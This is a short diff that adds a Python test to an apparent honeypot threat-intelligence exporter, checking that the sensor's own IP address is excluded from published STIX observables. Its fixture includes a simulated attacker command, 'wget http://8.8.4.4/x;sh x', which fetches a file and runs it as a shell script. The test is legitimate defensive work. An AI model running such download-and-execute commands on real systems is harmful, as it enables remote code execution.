@@ -57,3 +57,12 @@ def test_ip_host_becomes_observable_linked_to_its_url():
 def test_private_ip_host_is_not_published():
     objs = _build(_session(["wget http://192.168.1.1/r"]))
     assert not [o for o in objs if o["type"] == "ipv4-addr" and o.get("value") == "192.168.1.1"]
+
+
+def test_own_sensor_address_is_not_published(monkeypatch):
+    # a public sensor address configured as ours: its URL, IPv4 SCO and edge must not appear
+    monkeypatch.setenv("TPOT_HONEYPOT_IPS", "8.8.4.4")
+    objs = _build(_session(["wget http://8.8.4.4/x;sh x", "wget http://9.9.9.9/a"]))
+    assert not [o for o in objs if o["type"] == "ipv4-addr" and o.get("value") == "8.8.4.4"]
+    assert not [o for o in objs if o["type"] == "url" and "8.8.4.4" in o.get("value", "")]
+    assert [o for o in objs if o["type"] == "ipv4-addr" and o.get("value") == "9.9.9.9"]
